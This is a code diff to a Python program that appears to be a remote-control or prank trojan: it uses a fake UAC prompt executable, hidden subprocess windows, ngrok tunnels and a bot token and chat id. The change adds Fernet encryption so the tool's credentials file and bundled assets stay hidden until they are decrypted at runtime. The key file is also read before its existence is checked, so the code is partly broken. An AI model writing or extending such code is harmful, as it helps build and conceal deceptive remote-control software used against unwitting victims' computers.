@@ -58,6 +58,7 @@ from typing import Any, Callable
 from time import monotonic, sleep
 from random import choice, randint
 from winotify import audio, Notification
+from cryptography.fernet import Fernet
 from webbrowser import open as browseropen
 from string import ascii_letters, printable
 from subprocess import CREATE_NO_WINDOW, PIPE, Popen
@@ -99,12 +100,20 @@ try:
     sfx = resource_path(join("assets", "sfx"))
     executables = resource_path(join("assets", "executables"))
     fake_uac_prompt_path = join(executables, "fakeuac.exe")
+    keyfile = resource_path("key.key")
     prototxt_filename = resource_path(join("assets","model","1.prototxt"))
     caffemodel_filename = resource_path(join("assets","model","2.caffemodel"))
     DLLS_DIR = resource_path(join("assets", "dlls"))
 except Exception as e:
     print(e)
     exit()
+
+DATA_ENCRYPTION = exists(keyfile)
+with open(keyfile, "rb") as key_fi:
+    FERNET_KEY = key_fi.read()
+if DATA_ENCRYPTION:
+    FERNET = Fernet(FERNET_KEY)
+
 if isdir(DLLS_DIR):
     print(f"DLLS Directory exists: {DLLS_DIR}")
     for file in listdir(DLLS_DIR):
@@ -131,6 +140,31 @@ def _patched_popen(*args, **kwargs):
     kwargs.setdefault("stderr", PIPE)
     kwargs.setdefault("stdout", PIPE)
     return Popen(*args, **kwargs)
+
+def get_decrypted_content(fernet, src_path) -> str:
+    with open(src_path, "rb") as f:
+        encrypted = f.read()
+    decrypted = fernet.decrypt(encrypted)
+    return decrypted
+
+def decrypt_file(fernet, src_path, dst_path):
+    decrypted = get_decrypted_content(fernet, src_path)
+    with open(dst_path, "wb") as f:
+        f.write(decrypted)
+
+def decrypt_directory(fernet, src_dir, filter: Callable[[str], bool]|None=None):
+    for root, dirs, files in os.walk(src_dir):
+        for file in files:
+            if filter:
+                if not filter(file):
+                    continue
+            enc_path = os.path.join(root, file)
+            plain_path = os.path.join(root, file[:-4])
+            try:
+                decrypt_file(fernet, enc_path, plain_path)
+                os.remove(enc_path)
+            except Exception:
+                pass  # or log/raise depending on your needs
 
 def close_all_tunnels(ngrok):
     tunnels = ngrok.get_tunnels()
@@ -177,8 +211,11 @@ def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     """
     returns token, chatid, ngrok_token, tunnel_provider
     """
-    with open(filename) as fi:
-        var = json.load(fi)
+    if DATA_ENCRYPTION:
+        var = json.loads(get_decrypted_content(FERNET, filename))
+    else:
+        with open(filename) as fi:
+            var = json.load(fi)
     return var["token"],var["chatid"],var["ngrok_token"],var["tunnel_provider"]
         
 #Resizing assets so they all take the same time to load when doing jumpscares(I guess)
